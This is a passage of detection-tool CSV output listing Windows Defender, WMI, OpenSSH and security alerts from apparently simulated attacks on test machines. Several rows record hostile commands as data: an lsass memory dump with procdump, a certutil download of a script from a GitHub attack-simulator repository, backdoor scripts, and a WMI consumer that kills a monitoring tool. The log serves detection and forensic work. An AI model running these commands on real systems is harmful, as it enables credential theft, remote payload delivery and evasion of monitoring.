Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147760510 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:06:33.528 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,113,"Threat: Backdoor:PowerShell/Powercat.A ¦ Severity: Severe ¦ Type: Backdoor ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\TMP\nc.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 6 ¦ Detection ID: {9BD7D993-77BF-4EB2-B009-8A2271E9E0B0} ¦ Detection Time: 2022-05-08T19:06:33.492Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Backdoor:PowerShell/Powercat.A&threatid=2147745713&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147745713 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:06:43.306 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,114,"Threat: HackTool:Win32/DumpLsass.E ¦ Severity: High ¦ Type: Tool ¦ User: NT AUTHORITY\SYSTEM ¦ Path: CmdLine:_C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\TMP\somethingwindows.dmp ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 34 ¦ Detection ID: {5035DAF6-ECD0-453B-8A51-03B5BD0F66EF} ¦ Detection Time: 2022-05-08T19:06:43.302Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 0 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/DumpLsass.E&threatid=2147786200&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 4 ¦ Source ID: 2 ¦ Source Name: System ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147786200 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:07:02.708 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,136,"Threat: SettingsModifier:Win32/PossibleHostsFileHijack ¦ Severity: Medium ¦ Type: Settings Modifier ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Windows\System32\drivers\etc\hosts ¦ Proc: C:\Windows\System32\cmd.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 23 ¦ Detection ID: {8B2C526E-F209-497B-8CBB-08B50591BC05} ¦ Detection Time: 2022-05-08T19:07:02.555Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 2 ¦ Execution Name: Allowed ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 2 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 14994 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:07:02.827 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,137,"Threat: SettingsModifier:Win32/PossibleHostsFileHijack ¦ Severity: Medium ¦ Type: Settings Modifier ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Windows\System32\drivers\etc\hosts ¦ Proc: C:\Program Files\Adobe\Acrobat DC\Acrobat\acrocef_1\AcroCEF.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 23 ¦ Detection ID: {8B2C526E-F209-497B-8CBB-08B50591BC05} ¦ Detection Time: 2022-05-08T19:07:02.555Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 2 ¦ Execution Name: Allowed ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 2 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 14994 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:07:02.943 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,138,"Threat: SettingsModifier:Win32/PossibleHostsFileHijack ¦ Severity: Medium ¦ Type: Settings Modifier ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Windows\System32\drivers\etc\hosts ¦ Proc: C:\Program Files\Google\Drive File Stream\57.0.5.0\GoogleDriveFS.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 23 ¦ Detection ID: {8B2C526E-F209-497B-8CBB-08B50591BC05} ¦ Detection Time: 2022-05-08T19:07:02.555Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 2 ¦ Execution Name: Allowed ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 2 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 14994 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:07:03.046 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,139,"Threat: SettingsModifier:Win32/PossibleHostsFileHijack ¦ Severity: Medium ¦ Type: Settings Modifier ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Windows\System32\drivers\etc\hosts ¦ Proc: C:\Program Files\Adobe\Acrobat DC\Acrobat\acrocef_1\AcroCEF.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 23 ¦ Detection ID: {8B2C526E-F209-497B-8CBB-08B50591BC05} ¦ Detection Time: 2022-05-08T19:07:02.555Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 2 ¦ Execution Name: Allowed ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 2 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 14994 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:07:03.154 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,140,"Threat: SettingsModifier:Win32/PossibleHostsFileHijack ¦ Severity: Medium ¦ Type: Settings Modifier ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Windows\System32\drivers\etc\hosts ¦ Proc: C:\Program Files\Google\Drive File Stream\57.0.5.0\GoogleDriveFS.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 23 ¦ Detection ID: {8B2C526E-F209-497B-8CBB-08B50591BC05} ¦ Detection Time: 2022-05-08T19:07:02.555Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 2 ¦ Execution Name: Allowed ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 2 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 14994 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:07:06.737 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,142,"Threat: Trojan:Win32/Ceprolad.A ¦ Severity: Severe ¦ Type: Trojan ¦ User: NT AUTHORITY\SYSTEM ¦ Path: CmdLine:_C:\Windows\System32\cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js C:\Users\Public\en-US.js ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {9C9EA944-BC65-4323-B075-D8F3C31F0D90} ¦ Detection Time: 2022-05-08T19:07:06.727Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 0 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 2 ¦ Source Name: System ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147726914 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:07:49.510 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,147,"Threat: SettingsModifier:Win32/PossibleHostsFileHijack ¦ Severity: Medium ¦ Type: Settings Modifier ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Windows\System32\drivers\etc\hosts ¦ Proc: C:\Program Files\Adobe\Acrobat DC\Acrobat\acrocef_1\AcroCEF.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 23 ¦ Detection ID: {8B2C526E-F209-497B-8CBB-08B50591BC05} ¦ Detection Time: 2022-05-08T19:07:02.555Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 2 ¦ Execution Name: Allowed ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 2 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 14994 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:09:30.038 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,150,"Threat: SettingsModifier:Win32/PossibleHostsFileHijack ¦ Severity: Medium ¦ Type: Settings Modifier ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Windows\System32\drivers\etc\hosts ¦ Proc: C:\Program Files\Adobe\Acrobat DC\Acrobat\acrocef_1\AcroCEF.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 23 ¦ Detection ID: {8B2C526E-F209-497B-8CBB-08B50591BC05} ¦ Detection Time: 2022-05-08T19:07:02.555Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 2 ¦ Execution Name: Allowed ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 2 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 14994 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:09:30.317 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,151,"Threat: SettingsModifier:Win32/PossibleHostsFileHijack ¦ Severity: Medium ¦ Type: Settings Modifier ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Windows\System32\drivers\etc\hosts ¦ Proc: C:\Program Files\Google\Drive File Stream\57.0.5.0\GoogleDriveFS.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 23 ¦ Detection ID: {8B2C526E-F209-497B-8CBB-08B50591BC05} ¦ Detection Time: 2022-05-08T19:07:02.555Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 2 ¦ Execution Name: Allowed ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 2 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 14994 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:09:31.764 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,153,"Threat: Trojan:Script/Wacatac.B!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\TMP\schtasks-backdoor.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {F4EB612D-601D-43AE-BB2C-CC2553E62313} ¦ Detection Time: 2022-05-08T19:09:31.186Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Script/Wacatac.B!ml&threatid=2147735503&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147735503 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:09:57.199 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,176,"Threat: SettingsModifier:Win32/PossibleHostsFileHijack ¦ Severity: Medium ¦ Type: Settings Modifier ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Windows\System32\drivers\etc\hosts ¦ Proc: C:\Program Files\Google\Drive File Stream\57.0.5.0\GoogleDriveFS.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 23 ¦ Detection ID: {8B2C526E-F209-497B-8CBB-08B50591BC05} ¦ Detection Time: 2022-05-08T19:07:02.555Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 2 ¦ Execution Name: Allowed ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 2 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 14994 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:10:11.715 +02:00","Windows Defender Real-time Protection Disabled","high","PEGASUS01","Defender",5001,177,"Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5","-","e6c2628d-e4dc-0b32-e087-1c205385af72"
"2019-03-19 13:59:30.075 +01:00","WMI Persistence","med","MSEDGEWIN10","WMI",5859,2,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-32-544 ¦ PID: 2804 ¦ Provider: SCM Event Provider ¦ PossibleCause: Permanent","Query: select * from MSFT_SCMEventLogEvent ¦ queryid: 0","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2019-03-19 14:03:07.244 +01:00","WMI Persistence","med","MSEDGEWIN10","WMI",5859,152,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-32-544 ¦ PID: 2580 ¦ Provider: SCM Event Provider ¦ PossibleCause: Permanent","Query: select * from MSFT_SCMEventLogEvent ¦ queryid: 0","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2019-03-19 14:08:53.241 +01:00","WMI Persistence","med","MSEDGEWIN10","WMI",5859,164,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-32-544 ¦ PID: 2416 ¦ Provider: SCM Event Provider ¦ PossibleCause: Permanent","Query: select * from MSFT_SCMEventLogEvent ¦ queryid: 0","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2019-03-19 14:14:03.235 +01:00","WMI Persistence","med","MSEDGEWIN10","WMI",5859,179,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-32-544 ¦ PID: 2588 ¦ Provider: SCM Event Provider ¦ PossibleCause: Permanent","Query: select * from MSFT_SCMEventLogEvent ¦ queryid: 0","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2019-03-19 14:24:34.244 +01:00","WMI Persistence","med","MSEDGEWIN10","WMI",5859,194,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-32-544 ¦ PID: 2484 ¦ Provider: SCM Event Provider ¦ PossibleCause: Permanent","Query: select * from MSFT_SCMEventLogEvent ¦ queryid: 0","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2022-04-29 18:34:20.996 +02:00","WMI Persistence","med","MSEDGEWIN10","WMI",5859,221,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-32-544 ¦ PID: 2492 ¦ Provider: SCM Event Provider ¦ PossibleCause: Permanent","Query: select * from MSFT_SCMEventLogEvent ¦ queryid: 0","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2022-04-29 18:45:19.699 +02:00","WMI Persistence","med","PEGASUS01","WMI",5859,250,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-32-544 ¦ PID: 2416 ¦ Provider: SCM Event Provider ¦ PossibleCause: Permanent","Query: select * from MSFT_SCMEventLogEvent ¦ queryid: 0","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2022-04-29 10:36:30.636 +02:00","WMI Persistence","med","PEGASUS01","WMI",5859,282,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-32-544 ¦ PID: 2348 ¦ Provider: SCM Event Provider ¦ PossibleCause: Permanent","Query: select * from MSFT_SCMEventLogEvent ¦ queryid: 0","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2022-04-29 12:40:19.170 +02:00","WMI Persistence","med","PEGASUS01","WMI",5859,306,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-32-544 ¦ PID: 2408 ¦ Provider: SCM Event Provider ¦ PossibleCause: Permanent","Query: select * from MSFT_SCMEventLogEvent ¦ queryid: 0","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2022-05-08 21:09:56.958 +02:00","WMI Persistence","med","PEGASUS01","WMI",5861,329,"CONSUMER: ActiveScriptEventConsumer=""KillProcess"" ¦ ESS: ProcessStartTrigger ¦ Namespace: //./root/subscription ¦ PossibleCause: Binding EventFilter: instance of __EventFilter { CreatorSID = {1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 96, 64, 34, 19, 186, 199, 57, 224, 200, 235, 19, 21, 232, 3, 0, 0}; EventNamespace = ""ROOT\\cimv2""; Name = ""ProcessStartTrigger""; Query = ""SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe'""; QueryLanguage = ""WQL""; }; Perm. Consumer: instance of ActiveScriptEventConsumer { CreatorSID = {1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 96, 64, 34, 19, 186, 199, 57, 224, 200, 235, 19, 21, 232, 3, 0, 0}; KillTimeout = 45; Name = ""KillProcess""; ScriptingEngine = ""VBScript""; ScriptText = "" Dim oLocation, oServices, oProcessList, oProcess\n\n\t Set oLocation = CreateObject(\""WbemScripting.SWbemLocator\"")\n\t Set oServices = oLocation.ConnectServer(, \""root\\cimv2\"")\n\t Set oProcessList = oServices.ExecQuery(\""SELECT * FROM Win32_Process WHERE ProcessID = \"" & TargetEvent.ProcessID)\n\t For Each oProcess in oProcessList\n\t\t oProcess.Terminate()\n\t Next""; };","-","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2022-05-08 21:09:57.004 +02:00","WMI Persistence","med","PEGASUS01","WMI",5859,330,"Namespace: //./root/CIMV2 ¦ Query: n/a ¦ SID: S-1-5-21-321011808-3761883066-353627080-1000 ¦ PID: 2408 ¦ Provider: WMI Kernel Trace Event Provider ¦ PossibleCause: Permanent","Query: SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe' ¦ queryid: 2","efac5da1-1be2-d8d6-863e-d61125c1cbbd"
"2019-03-19 14:23:56.943 +01:00","OpenSSH Server Listening On Socket","med","MSEDGEWIN10","OpenSSH",4,1,"payload: Server listening on :: port 22. ¦ process: sshd","-","12800c31-cb60-9d63-bcc2-9ad342585c3a"
"2019-03-19 14:23:56.943 +01:00","OpenSSH Server Listening On Socket","med","MSEDGEWIN10","OpenSSH",4,2,"payload: Server listening on 0.0.0.0 port 22. ¦ process: sshd","-","12800c31-cb60-9d63-bcc2-9ad342585c3a"
"2019-03-19 21:57:23.437 +01:00","User Added To Local Admin Grp","high","MSEDGEWIN10","Sec",4732,204,"SrcSID: S-1-5-21-321011808-3761883066-353627080-1000 ¦ TgtGrp: Administrators ¦ LID: 0x3e7","MemberName: - ¦ PrivilegeList: - ¦ SubjectDomainName: WORKGROUP ¦ SubjectUserName: MSEDGEWIN10$ ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: Builtin ¦ TargetSid: S-1-5-32-544","611e2e76-a28f-4255-812c-eb8836b2f5bb"
